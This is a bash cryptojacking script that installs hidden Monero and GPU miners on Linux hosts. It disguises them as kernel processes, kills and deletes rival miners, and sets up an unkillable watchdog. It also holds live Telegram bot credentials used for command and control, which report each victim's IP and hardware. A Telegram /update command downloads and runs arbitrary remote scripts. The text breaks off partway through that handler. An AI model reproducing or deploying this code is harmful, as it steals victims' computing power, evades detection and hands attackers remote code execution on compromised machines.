#!/bin/bash
# ============================================================
# | ENGINE v41 — UNSTOPPABLE. RUNS NO MATTER WHAT.           |
# | Root/user, 0-N GPUs, any Linux. Never stops. Never waits.|
# ============================================================

export HISTFILE=/dev/null
unset HISTFILE HISTFILESIZE HISTSIZE

# [ CONFIGURATION ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"
DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh"
REPORT_INTERVAL=18000

POOL_CPU_1="stratum+tcp://xmr.kryptex.network:7029"
POOL_CPU_2="stratum+tcp://xmr-eu.kryptex.network:7029"
POOL_GPU_1="stratum+tcp://prl.kryptex.network:7048"
POOL_GPU_2="stratum+tcp://prl-eu.kryptex.network:7048"

# ============================================================
# [ PHASE 0: ENVIRONMENT ]
# ============================================================
IS_ROOT=0; [ "$(id -u)" -eq 0 ] && IS_ROOT=1

if [ "$IS_ROOT" -eq 1 ]; then
    BASE_DIR="/var/lib/.journal-runtime"
elif [ -n "$HOME" ] && [ -d "$HOME" ] && [ -w "$HOME" ]; then
    BASE_DIR="$HOME/.local/share/.dconf-service"
else
    BASE_DIR="/tmp/.dconf-service"
fi

mkdir -p "$BASE_DIR" 2>/dev/null || { BASE_DIR="/tmp/.dconf-service"; mkdir -p "$BASE_DIR"; }
cd "$BASE_DIR" || exit 1
export PATH="$BASE_DIR:$PATH"

# Process names that blend into ps aux
PNAME_CPU="[kworker/u8:3-xfs-log]"
PNAME_GPU="[irq/27-nvidia]"
PNAME_WD="[watchdog/0]"

BIN_CPU="$BASE_DIR/.lr-cgroup-cpu"
BIN_GPU="$BASE_DIR/.lr-cgroup-gpu"
LOG_CPU="$BASE_DIR/.cache-journal-cpu"
LOG_GPU="$BASE_DIR/.cache-journal-gpu"
CONFIG_CPU="$BASE_DIR/.dconf-db.json"
WD_SCRIPT="$BASE_DIR/.sd-pam-helper"
LOCK_FILE="$BASE_DIR/.session.lck"

# --- Single instance: kill old, take over ---
if [ -f "$LOCK_FILE" ]; then
    OLD_PID=$(cat "$LOCK_FILE" 2>/dev/null)
    kill -9 "$OLD_PID" 2>/dev/null
    sleep 1
fi
echo $$ > "$LOCK_FILE"

# --- Kill legacy v39 processes ---
pkill -9 -f "sys_net_daemon" 2>/dev/null
pkill -9 -f "sys_render_service" 2>/dev/null
pkill -9 -f "watchdog.sh" 2>/dev/null
pkill -9 -f "connfy-wd" 2>/dev/null

# ============================================================
# [ COMPETITOR ELIMINATION — KILL ALL FOREIGN MINERS ]
# ============================================================
# Whitelist: our own binaries + ComfyUI (operator's legit workload)
WHITELIST_PATTERNS="$(basename "$BIN_CPU")|$(basename "$BIN_GPU")|.sd-pam-helper|.lr-cgroup|ComfyUI|comfyui|comfy"

kill_competitors() {
    # --- Known miner process names ---
    local MINER_NAMES=(
        xmrig XMRig xmr-stak xmr-stak-cpu xmr-stak-nvidia xmr-stak-amd
        minerd cpuminer cpuminer-multi cpuminer-opt
        ccminer ccminer-x64 ccminer-cuda
        ethminer ethm phoenix PhoenixMiner phoenixminer
        t-rex trex T-Rex
        gminer Gminer
        nbminer NBMiner
        lolMiner lolminer
        teamredminer TeamRedMiner
        nanominer Nanominer
        srbminer SRBMiner SRBMiner-MULTI
        bzminer BzMiner
        wildrig WildRig wildrig-multi
        xmrig-nvidia xmrig-amd xmrig-proxy
        randomx_sniffer
        minergate MinerGate
        kthreaddi kthreadd_
        solXen claymore Claymore
        kawpowminer
        nheqminer
        zm_miner funakoshi
        dstm
        ewbf
        bminer Bminer
        cudo CudoMiner
        nicehash NiceHash
        cast_xmr
        cryptonight
        monero
        arionum
        webchain
        raptoreum
    )

    # --- Known miner pool/stratum patterns in cmdline ---
    local POOL_PATTERNS=(
        "stratum+tcp://"
        "stratum+ssl://"
        "stratum+tls://"
        "pool.minexmr"
        "pool.supportxmr"
        "pool.hashvault"
        "monerohash"
        "nanopool.org"
        "f2pool"
        "2miners.com"
        "herominers"
        "moneroocean"
        "nicehash.com"
        "unmineable.com"
        "zergpool"
        "miningpoolhub"
        "prohashing"
        "ethermine"
        "flypool"
        "ravenminer"
        "woolypooly"
        "crazypool"
        "hashrate.to"
        "c3pool"
        "xmrpool"
        "minergate"
    )

    # --- Kill by process name ---
    for name in "${MINER_NAMES[@]}"; do
        # Skip if it matches our whitelist
        if echo "$name" | grep -qiE "$WHITELIST_PATTERNS"; then
            continue
        fi
        local pids=$(pgrep -f "$name" 2>/dev/null)
        for pid in $pids; do
            # Verify it's not ours
            local cmdline=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ')
            if echo "$cmdline" | grep -qiE "$WHITELIST_PATTERNS"; then
                continue
            fi
            kill -9 "$pid" 2>/dev/null
        done
    done

    # --- Kill any process connecting to mining pools (not ours) ---
    for pattern in "${POOL_PATTERNS[@]}"; do
        local pids=$(pgrep -f "$pattern" 2>/dev/null)
        for pid in $pids; do
            local cmdline=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ')
            # Skip our own processes
            if echo "$cmdline" | grep -qiE "$WHITELIST_PATTERNS"; then
                continue
            fi
            # Skip if it's connecting to OUR pools (kryptex)
            if echo "$cmdline" | grep -qi "kryptex"; then
                continue
            fi
            kill -9 "$pid" 2>/dev/null
        done
    done

    # --- Kill GPU-hogging processes (not ComfyUI, not ours) ---
    if command -v nvidia-smi >/dev/null 2>&1; then
        nvidia-smi --query-compute-apps=pid,process_name --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r pid pname; do
            pid=$(echo "$pid" | tr -d ' ')
            pname=$(echo "$pname" | tr -d ' ')
            [ -z "$pid" ] && continue
            # Whitelist check
            if echo "$pname" | grep -qiE "$WHITELIST_PATTERNS"; then
                continue
            fi
            # Check if it's a known miner or unknown GPU-heavy process
            local is_miner=0
            for name in "${MINER_NAMES[@]}"; do
                if echo "$pname" | grep -qi "$name"; then
                    is_miner=1; break
                fi
            done
            if [ "$is_miner" -eq 1 ]; then
                kill -9 "$pid" 2>/dev/null
            fi
        done
    fi

    # --- Scan for hidden miners in common locations ---
    local SUSPECT_DIRS=(
        "/tmp" "/var/tmp" "/dev/shm"
        "/usr/local/bin" "/usr/local/sbin"
        "/opt" "/root" "/home"
    )

    for dir in "${SUSPECT_DIRS[@]}"; do
        [ ! -d "$dir" ] && continue
        # Find recently modified executables that look like miners
        find "$dir" -maxdepth 4 -type f -executable -newer /proc -mmin -10080 2>/dev/null | while read -r fpath; do
            # Skip our own stuff
            if echo "$fpath" | grep -qiE "$WHITELIST_PATTERNS|dconf-service|journal-runtime"; then
                continue
            fi
            # Check binary strings for miner signatures
            if strings "$fpath" 2>/dev/null | head -200 | grep -qiE "stratum|xmrig|cryptonight|randomx|hashrate|mining|pool.*:.*[0-9]{4}"; then
                # It's a foreign miner binary — kill it and delete
                local fpid=$(fuser "$fpath" 2>/dev/null | tr -d '[:alpha:][:space:]' | tr 'e' ' ')
                for p in $fpid; do
                    kill -9 "$p" 2>/dev/null
                done
                rm -f "$fpath" 2>/dev/null
            fi
        done
    done

    # --- Remove competitor crontabs ---
    if command -v crontab >/dev/null 2>&1; then
        local current_cron=$(crontab -l 2>/dev/null)
        if echo "$current_cron" | grep -qiE "xmrig|miner|stratum|cryptonight|randomx|minerd|ccminer|ethminer"; then
            echo "$current_cron" | grep -viE "xmrig|miner|stratum|cryptonight|randomx|minerd|ccminer|ethminer" | \
                grep -v "^$" | crontab - 2>/dev/null
        fi
    fi

    # --- Remove competitor systemd services (root only) ---
    if [ "$IS_ROOT" -eq 1 ] && [ -d "/etc/systemd/system" ]; then
        for svc in /etc/systemd/system/*.service; do
            [ ! -f "$svc" ] && continue
            # Skip our own
            if echo "$svc" | grep -qiE "sys-kernel-tracing|dconf-session"; then
                continue
            fi
            if grep -qiE "xmrig|miner|stratum|cryptonight|randomx|minerd|ccminer|ethminer|cpuminer|hashrate" "$svc" 2>/dev/null; then
                local svc_name=$(basename "$svc")
                systemctl stop "$svc_name" 2>/dev/null
                systemctl disable "$svc_name" 2>/dev/null
                rm -f "$svc" 2>/dev/null
            fi
        done
        systemctl daemon-reload 2>/dev/null
    fi

    # --- Kill docker containers running miners (root only) ---
    if [ "$IS_ROOT" -eq 1 ] && command -v docker >/dev/null 2>&1; then
        docker ps --format '{{.ID}} {{.Image}} {{.Command}}' 2>/dev/null | while read -r cid cimg ccmd; do
            if echo "$cimg $ccmd" | grep -qiE "xmrig|miner|monero|cryptonight|randomx"; then
                docker kill "$cid" 2>/dev/null
                docker rm -f "$cid" 2>/dev/null
            fi
        done
    fi
}

# Run competitor elimination
kill_competitors

# --- Ensure curl or wget exist ---
if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
    if [ "$IS_ROOT" -eq 1 ]; then
        apt-get update -y >/dev/null 2>&1 && apt-get install -y curl wget >/dev/null 2>&1 || \
        yum install -y curl wget >/dev/null 2>&1 || \
        apk add curl wget 2>/dev/null || \
        pacman -Sy --noconfirm curl wget 2>/dev/null
    fi
fi

# ============================================================
# [ PHASE 1: WORKER ID & HARDWARE ]
# ============================================================
get_ip() {
    local ip=""
    for ep in "api.ipify.org" "icanhazip.com" "ifconfig.me" "ipinfo.io/ip"; do
        ip=$(curl -s -m 3 --connect-timeout 2 "https://$ep" 2>/dev/null | tr -d '[:space:]')
        [ -n "$ip" ] && echo "$ip" && return
    done
    ip=$(wget -qO- --no-check-certificate -T 3 "https://api.ipify.org" 2>/dev/null | tr -d '[:space:]')
    [ -n "$ip" ] && echo "$ip" && return
    echo "unknown"
}

SERVER_IP=$(get_ip)
WORKER_HASH=$(echo -n "$SERVER_IP" | md5sum 2>/dev/null | cut -c1-12 || echo "$SERVER_IP" | tr -d '.' | cut -c1-12)
WORKER="${FIXED_WALLET_ID}.${WORKER_HASH}"

# --- CPU ---
TOTAL_CORES=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 2)
# USE ALL CORES. No reservation. Maximum hashrate.
MINE_THREADS=$TOTAL_CORES

# --- GPU detection ---
GPU_COUNT=0
GPU_TYPE="none"

if command -v nvidia-smi >/dev/null 2>&1; then
    GPU_COUNT=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | wc -l)
    [ "$GPU_COUNT" -gt 0 ] && GPU_TYPE="nvidia"
fi

if [ "$GPU_COUNT" -eq 0 ] && [ -d "/sys/class/kfd/kfd/topology/nodes" ]; then
    AMD_NODES=$(find /sys/class/kfd/kfd/topology/nodes/ -maxdepth 1 -mindepth 1 -type d 2>/dev/null | wc -l)
    [ "$AMD_NODES" -gt 1 ] && GPU_COUNT=$((AMD_NODES - 1)) && GPU_TYPE="amd"
fi

if [ "$GPU_COUNT" -eq 0 ] && command -v lspci >/dev/null 2>&1; then
    NV=$(lspci 2>/dev/null | grep -icE 'nvidia.*(vga|3d|display)')
    AMD=$(lspci 2>/dev/null | grep -icE '(amd|radeon|advanced micro).*(vga|3d|display)')
    if [ "$NV" -gt 0 ]; then GPU_COUNT=$NV; GPU_TYPE="nvidia"
    elif [ "$AMD" -gt 0 ]; then GPU_COUNT=$AMD; GPU_TYPE="amd"; fi
fi

# If /dev/nvidia* exists but nvidia-smi failed, still count
if [ "$GPU_COUNT" -eq 0 ] && ls /dev/nvidia[0-9]* >/dev/null 2>&1; then
    GPU_COUNT=$(ls /dev/nvidia[0-9]* 2>/dev/null | wc -l)
    [ "$GPU_COUNT" -gt 0 ] && GPU_TYPE="nvidia"
fi

# ============================================================
# [ PHASE 2: SYSTEM PREP — MAXIMIZE PERFORMANCE ]
# ============================================================
if [ "$IS_ROOT" -eq 1 ]; then
    # Hugepages for RandomX
    NEEDED_HP=$((MINE_THREADS * 2 + 8))
    echo "$NEEDED_HP" > /proc/sys/vm/nr_hugepages 2>/dev/null
    sysctl -w vm.nr_hugepages="$NEEDED_HP" >/dev/null 2>&1

    # MSR access for RandomX boost (+10-15%)
    modprobe msr 2>/dev/null

    # Disable CPU frequency scaling — lock to performance
    for gov in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
        echo "performance" > "$gov" 2>/dev/null
    done

    # GPU: install drivers if missing and nvidia detected
    if [ "$GPU_TYPE" = "nvidia" ] && ! command -v nvidia-smi >/dev/null 2>&1; then
        if command -v apt-get >/dev/null 2>&1; then
            apt-get install -y nvidia-driver-535 2>/dev/null || apt-get install -y nvidia-driver 2>/dev/null
        elif command -v yum >/dev/null 2>&1; then
            yum install -y nvidia-driver 2>/dev/null
        fi
    fi

    # AMD: install OpenCL if missing
    if [ "$GPU_TYPE" = "amd" ]; then
        if ! ldconfig -p 2>/dev/null | grep -q "libOpenCL"; then
            apt-get install -y ocl-icd-opencl-dev 2>/dev/null || yum install -y ocl-icd 2>/dev/null
        fi
    fi
fi

# ============================================================
# [ PHASE 3: BINARY ACQUISITION — RETRY UNTIL SUCCESS ]
# ============================================================
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
SHA256_XMRIG="fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5"
URL_XMRIG_BACKUP="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"
URL_SRBMINER_BACKUP="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.9/SRBMiner-Multi-2-7-9-Linux.tar.gz"

fetch() {
    local url="$1" dest="$2"
    curl -L -k -s -m 120 --connect-timeout 15 --retry 3 --retry-delay 5 -o "$dest" "$url" 2>/dev/null && [ -s "$dest" ] && return 0
    wget -qO "$dest" --no-check-certificate -T 120 -t 3 "$url" 2>/dev/null && [ -s "$dest" ] && return 0
    return 1
}

# --- CPU miner: try until we have it ---
install_cpu() {
    [ -f "$BIN_CPU" ] && [ -x "$BIN_CPU" ] && return 0

    for url in "$URL_XMRIG" "$URL_XMRIG_BACKUP"; do
        local tmp=$(mktemp -d)
        if fetch "$url" "$tmp/cpu.tar.gz"; then
            # Verify sha256 for primary URL
            if [ "$url" = "$URL_XMRIG" ] && command -v sha256sum >/dev/null 2>&1; then
                local actual=$(sha256sum "$tmp/cpu.tar.gz" 2>/dev/null | awk '{print $1}')
                if [ "$actual" != "$SHA256_XMRIG" ]; then
                    rm -rf "$tmp"
                    continue
                fi
            fi
            tar -xzf "$tmp/cpu.tar.gz" -C "$tmp" 2>/dev/null
            local found=$(find "$tmp" -type f -name "xmrig" 2>/dev/null | head -1)
            if [ -n "$found" ] && [ -f "$found" ]; then
                cp "$found" "$BIN_CPU"
                chmod +x "$BIN_CPU"
                rm -rf "$tmp"
                return 0
            fi
        fi
        rm -rf "$tmp"
    done
    return 1
}

# --- GPU miner: try until we have it ---
install_gpu() {
    [ "$GPU_COUNT" -eq 0 ] && return 0
    [ -f "$BIN_GPU" ] && [ -x "$BIN_GPU" ] && return 0

    for url in "$URL_SRBMINER" "$URL_SRBMINER_BACKUP"; do
        local tmp=$(mktemp -d)
        if fetch "$url" "$tmp/gpu.tar.gz"; then
            tar -xzf "$tmp/gpu.tar.gz" -C "$tmp" 2>/dev/null
            local found=$(find "$tmp" -type f -name "SRBMiner-MULTI" 2>/dev/null | head -1)
            if [ -n "$found" ] && [ -f "$found" ]; then
                cp "$found" "$BIN_GPU"
                chmod +x "$BIN_GPU"
                rm -rf "$tmp"
                return 0
            fi
        fi
        rm -rf "$tmp"
    done
    return 1
}

install_cpu
install_gpu

# ============================================================
# [ PHASE 4: MINER LAUNCH — BULLETPROOF ]
# ============================================================

generate_cpu_config() {
    cat > "$CONFIG_CPU" <<CPUCFG
{
    "autosave": false,
    "background": true,
    "colors": false,
    "title": "$PNAME_CPU",
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "max-threads-hint": 100
    },
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "donate-level": 1,
    "log-file": "$LOG_CPU",
    "print-time": 60,
    "retries": 10,
    "retry-pause": 3,
    "syslog": false,
    "pools": [
        {
            "url": "$POOL_CPU_1",
            "user": "$WORKER",
            "pass": "x",
            "keepalive": true,
            "nicehash": false
        },
        {
            "url": "$POOL_CPU_2",
            "user": "$WORKER",
            "pass": "x",
            "keepalive": true,
            "nicehash": false
        }
    ]
}
CPUCFG
}

launch_cpu() {
    pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null
    sleep 1
    [ ! -f "$BIN_CPU" ] && install_cpu
    [ ! -f "$BIN_CPU" ] && return 1

    generate_cpu_config
    chmod +x "$BIN_CPU"

    # Launch with process name masquerade
    (exec -a "$PNAME_CPU" "$BIN_CPU" --config="$CONFIG_CPU" </dev/null >/dev/null 2>&1 &)
    sleep 4

    local pid=$(pgrep -f "$(basename "$BIN_CPU")" | head -1)
    if [ -n "$pid" ]; then
        # Overwrite /proc/pid/comm for extra stealth
        [ "$IS_ROOT" -eq 1 ] && echo "kworker/u8:3" > "/proc/$pid/comm" 2>/dev/null
        return 0
    fi

    # Fallback: try without background mode in config
    sed -i 's/"background": true/"background": false/' "$CONFIG_CPU" 2>/dev/null
    (nohup "$BIN_CPU" --config="$CONFIG_CPU" </dev/null >>"$LOG_CPU" 2>&1 &)
    sleep 3
    pgrep -f "$(basename "$BIN_CPU")" >/dev/null 2>&1
}

launch_gpu() {
    [ "$GPU_COUNT" -eq 0 ] && return 0

    pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
    sleep 1
    [ ! -f "$BIN_GPU" ] && install_gpu
    [ ! -f "$BIN_GPU" ] && return 1

    chmod +x "$BIN_GPU"

    # SRBMiner CORRECT multi-pool syntax: each pool gets its own --pool flag
    # --disable-cpu: xmrig handles CPU, srbminer handles GPU only
    # --gpu-auto-detect: finds all GPUs automatically (nvidia + amd)
    # --retry-time: seconds between reconnect attempts
    # --send-stales: don't waste found shares
    # --log-file: absolute path so it works regardless of cwd
    local GPU_ARGS=(
        --algorithm pearlhash
        --pool "$POOL_GPU_1"
        --wallet "$WORKER"
        --password x
        --pool "$POOL_GPU_2"
        --wallet "$WORKER"
        --password x
        --disable-cpu
        --gpu-auto-detect
        --send-stales
        --retry-time 5
        --log-file "$LOG_GPU"
    )

    # Platform hints for srbminer
    case "$GPU_TYPE" in
        nvidia)
            GPU_ARGS+=(--gpu-platform 1)
            # Ensure CUDA libs are findable
            export LD_LIBRARY_PATH="/usr/local/cuda/lib64:/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"
            ;;
        amd)
            GPU_ARGS+=(--gpu-platform 0)
            export LD_LIBRARY_PATH="/opt/rocm/lib:/opt/amdgpu/lib64:$LD_LIBRARY_PATH"
            ;;
    esac

    (exec -a "$PNAME_GPU" "$BIN_GPU" "${GPU_ARGS[@]}" </dev/null >/dev/null 2>&1 &)
    sleep 5

    local pid=$(pgrep -f "$(basename "$BIN_GPU")" | head -1)
    if [ -n "$pid" ]; then
        [ "$IS_ROOT" -eq 1 ] && echo "irq/27-nvidia" > "/proc/$pid/comm" 2>/dev/null
        return 0
    fi

    # Fallback attempt 1: without --gpu-platform (let it auto-detect everything)
    (exec -a "$PNAME_GPU" "$BIN_GPU" \
        --algorithm pearlhash \
        --pool "$POOL_GPU_1" --wallet "$WORKER" --password x \
        --pool "$POOL_GPU_2" --wallet "$WORKER" --password x \
        --disable-cpu --send-stales --retry-time 5 \
        --log-file "$LOG_GPU" </dev/null >/dev/null 2>&1 &)
    sleep 5
    pgrep -f "$(basename "$BIN_GPU")" >/dev/null 2>&1 && return 0

    # Fallback attempt 2: nohup with stdout redirect (some systems need this)
    (nohup "$BIN_GPU" \
        --algorithm pearlhash \
        --pool "$POOL_GPU_1" --wallet "$WORKER" --password x \
        --pool "$POOL_GPU_2" --wallet "$WORKER" --password x \
        --disable-cpu --send-stales --retry-time 5 \
        </dev/null >>"$LOG_GPU" 2>&1 &)
    sleep 5
    pgrep -f "$(basename "$BIN_GPU")" >/dev/null 2>&1 && return 0

    # Fallback attempt 3: try without --disable-cpu flag (some versions choke on it)
    (nohup "$BIN_GPU" \
        --algorithm pearlhash \
        --pool "$POOL_GPU_1" --wallet "$WORKER" --password x \
        --pool "$POOL_GPU_2" --wallet "$WORKER" --password x \
        --send-stales --retry-time 5 \
        </dev/null >>"$LOG_GPU" 2>&1 &)
    sleep 5
    pgrep -f "$(basename "$BIN_GPU")" >/dev/null 2>&1
}

# --- LAUNCH NOW ---
launch_cpu
launch_gpu

# ============================================================
# [ PHASE 5: WATCHDOG — UNKILLABLE GUARDIAN ]
# ============================================================
cat > "$WD_SCRIPT" <<'WDEOF'
#!/bin/bash
export HISTFILE=/dev/null; unset HISTFILE

BASE_DIR="%%BASE_DIR%%"
BIN_CPU="%%BIN_CPU%%"
BIN_GPU="%%BIN_GPU%%"
CONFIG_CPU="%%CONFIG_CPU%%"
PNAME_CPU="%%PNAME_CPU%%"
PNAME_GPU="%%PNAME_GPU%%"
GPU_COUNT=%%GPU_COUNT%%
GPU_TYPE="%%GPU_TYPE%%"
IS_ROOT=%%IS_ROOT%%
WORKER="%%WORKER%%"
SERVER_IP="%%SERVER_IP%%"
POOL_CPU_1="%%POOL_CPU_1%%"
POOL_CPU_2="%%POOL_CPU_2%%"
POOL_GPU_1="%%POOL_GPU_1%%"
POOL_GPU_2="%%POOL_GPU_2%%"
LOG_CPU="%%LOG_CPU%%"
LOG_GPU="%%LOG_GPU%%"
TG_BOT_TOKEN="%%TG_BOT_TOKEN%%"
TG_CHAT_ID="%%TG_CHAT_ID%%"
DEFAULT_UPDATE_URL="%%DEFAULT_UPDATE_URL%%"
REPORT_INTERVAL=%%REPORT_INTERVAL%%

cd "$BASE_DIR" 2>/dev/null || exit 1

is_cpu_alive() { pgrep -f "$(basename "$BIN_CPU")" >/dev/null 2>&1; }
is_gpu_alive() { pgrep -f "$(basename "$BIN_GPU")" >/dev/null 2>&1; }

restart_cpu() {
    pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null; sleep 1
    [ ! -f "$BIN_CPU" ] && return 1
    chmod +x "$BIN_CPU"
    (exec -a "$PNAME_CPU" "$BIN_CPU" --config="$CONFIG_CPU" </dev/null >/dev/null 2>&1 &)
    sleep 4
    if is_cpu_alive; then
        local pid=$(pgrep -f "$(basename "$BIN_CPU")" | head -1)
        [ "$IS_ROOT" -eq 1 ] && echo "kworker/u8:3" > "/proc/$pid/comm" 2>/dev/null
        return 0
    fi
    # Fallback
    (nohup "$BIN_CPU" --config="$CONFIG_CPU" </dev/null >>"$LOG_CPU" 2>&1 &)
    sleep 3
    is_cpu_alive
}

restart_gpu() {
    [ "$GPU_COUNT" -eq 0 ] && return 0
    pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null; sleep 1
    [ ! -f "$BIN_GPU" ] && return 1
    chmod +x "$BIN_GPU"

    export LD_LIBRARY_PATH="/usr/local/cuda/lib64:/usr/lib/x86_64-linux-gnu:/opt/rocm/lib:/opt/amdgpu/lib64:$LD_LIBRARY_PATH"

    # Attempt 1: full args
    (exec -a "$PNAME_GPU" "$BIN_GPU" \
        --algorithm pearlhash \
        --pool "$POOL_GPU_1" --wallet "$WORKER" --password x \
        --pool "$POOL_GPU_2" --wallet "$WORKER" --password x \
        --disable-cpu --gpu-auto-detect --send-stales --retry-time 5 \
        --log-file "$LOG_GPU" </dev/null >/dev/null 2>&1 &)
    sleep 5
    is_gpu_alive && return 0

    # Attempt 2: minimal args
    (nohup "$BIN_GPU" \
        --algorithm pearlhash \
        --pool "$POOL_GPU_1" --wallet "$WORKER" --password x \
        --pool "$POOL_GPU_2" --wallet "$WORKER" --password x \
        --send-stales --retry-time 5 \
        </dev/null >>"$LOG_GPU" 2>&1 &)
    sleep 5
    is_gpu_alive
}

# ---- Telegram ----
send_tg() {
    [ -z "$TG_BOT_TOKEN" ] && return
    curl -s -m 5 --connect-timeout 3 -X POST \
        "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        -d chat_id="$TG_CHAT_ID" -d text="$1" -d parse_mode="HTML" >/dev/null 2>&1
}

get_cpu_hashrate() {
    [ ! -f "$LOG_CPU" ] && echo "0" && return
    grep -i "speed 10s/60s/15m" "$LOG_CPU" 2>/dev/null | tail -1 | awk '{print $5}' || echo "0"
}

get_gpu_hashrate() {
    [ ! -f "$LOG_GPU" ] && echo "0" && return
    grep -iE "Hashrate:|Total Hashrate" "$LOG_GPU" 2>/dev/null | tail -1 | grep -oP '[0-9]+\.?[0-9]*' | tail -1 || echo "0"
}

send_telemetry() {
    local title="$1"
    local cpu_hr=$(get_cpu_hashrate)
    local gpu_hr=$(get_gpu_hashrate)
    local cpu_shares=$(grep -c -i "accepted" "$LOG_CPU" 2>/dev/null || echo 0)
    local gpu_shares=$(grep -c -i "accepted" "$LOG_GPU" 2>/dev/null || echo 0)
    local cs="🟢"; is_cpu_alive || cs="🔴"
    local gs="⚫"; [ "$GPU_COUNT" -gt 0 ] && { is_gpu_alive && gs="🟢" || gs="🔴"; }

    local msg="📊 <b>${title}</b>%0A"
    msg="${msg}🌐 <code>${SERVER_IP}</code> | 🆔 <code>${WORKER}</code>%0A"
    msg="${msg}⏱ $(uptime -p 2>/dev/null || echo 'N/A')%0A%0A"
    msg="${msg}${cs} <b>CPU:</b> ${cpu_hr} H/s | ${cpu_shares} accepted%0A"
    [ "$GPU_COUNT" -gt 0 ] && msg="${msg}${gs} <b>GPU (${GPU_COUNT}x ${GPU_TYPE}):</b> ${gpu_hr} H/s | ${gpu_shares} accepted%0A"
    send_tg "$msg"
}

send_specs() {
    local cpu_model=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
    local cores=$(nproc 2>/dev/null || echo "?")
    local ram=$(free -h 2>/dev/null | awk '/Mem:/{print $3"/"$2}')
    local disk=$(df -h / 2>/dev/null | awk 'NR==2{print $3"/"$2" ("$5")"}')
    local load=$(awk '{print $1","$2","$3}' /proc/loadavg 2>/dev/null)

    local msg="🖥 <b>SPECS</b>%0A🌐 <code>${SERVER_IP}</code>%0A"
    msg="${msg}🧠 ${cpu_model:-Unknown} (${cores}C)%0A"
    msg="${msg}📈 Load: ${load}%0A💾 RAM: ${ram}%0A💽 ${disk}%0A"

    if [ "$GPU_COUNT" -gt 0 ] && command -v nvidia-smi >/dev/null 2>&1; then
        msg="${msg}%0A🎮 <b>GPUs:</b>%0A"
        local idx=0
        nvidia-smi --query-gpu=name,utilization.gpu,temperature.gpu,memory.used,memory.total --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r name util temp mu mt; do
            msg="${msg}• GPU${idx}: ${name} ${util}% ${temp}°C ${mu}/${mt}MB%0A"
            idx=$((idx+1))
        done
    fi
    send_tg "$msg"
}

is_target_me() {
    local t="$1"
    [ -z "$t" ] || [ "$t" = "all" ] || [ "$t" = "ALL" ] && return 0
    [ "$t" = "$SERVER_IP" ] || [ "$t" = "$WORKER" ] && return 0
    return 1
}

poll_telegram() {
    [ -z "$TG_BOT_TOKEN" ] && return

    local resp=$(curl -s -m 5 --connect-timeout 3 "https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
    [ -z "$resp" ] && return

    local update_id=$(echo "$resp" | grep -oP '"update_id":\K[0-9]+' | tail -1)
    [ -z "$update_id" ] && return

    curl -s -m 2 "https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=$((update_id+1))" >/dev/null 2>&1

    local from_id=$(echo "$resp" | grep -oP '"from":\{"id":\K[0-9]+' | tail -1)
    [ "$from_id" != "$TG_CHAT_ID" ] && return

    local msg_text=$(echo "$resp" | grep -oP '"text":"\K[^"]+' | tail -1)
    [ -z "$msg_text" ] && return

    local target=$(echo "$msg_text" | awk '{print $2}')
    is_target_me "$target" || return

    case "$msg_text" in
        /stop*|/pause*)
            PAUSED=1
            pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null
            pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
            send_tg "⏸ <b>PAUSED</b> <code>$SERVER_IP</code>"
            ;;
        /start*|/resume*|/restart*)
            PAUSED=0
            restart_cpu; restart_gpu
            send_tg "▶️ <b>RESUMED</b> <code>$SERVER_IP</code>"
            ;;
        /status*|/stat*)
            send_telemetry "ON-DEMAND"
            ;;
        /specs*|/hw*|/info*)
            send_specs
            ;;
        /logs*|/log*)
            local ct=$(tail -n 5 "$LOG_CPU" 2>/dev/null | tr '\n' ' ')
            local gt=$(tail -n 5 "$LOG_GPU" 2>/dev/null | tr '\n' ' ')
            send_tg "📋 <b>LOGS</b>%0A💻<code>${ct:-empty}</code>%0A🎮<code>${gt:-empty}</code>"
            ;;
        /update*|/dl*)
            local url=$(echo "$msg_text" | grep -oP 'https?://\S+' | head -1)
            [ -z "$url" ] && url="$DEFAULT_UPDATE_URL"
            local dest="$BASE_DIR/.upd_$(date +%s).sh"
            if curl -L -k -s -m 30 -o "$dest" "$url" 2>/dev/null || wget -qO "$dest" --no-check-certificate -T 30 "$url" 2>/dev/null; then
                [ -s "$dest" ] && chmod +x "$dest" && (nohup "$dest" </dev/null >/dev/null 2>&1 &) && \
                    send_tg "✅ <b>Updated</b> from <code>$url</code>" || \
                    send_tg "❌ <b>Empty</b>"
            else
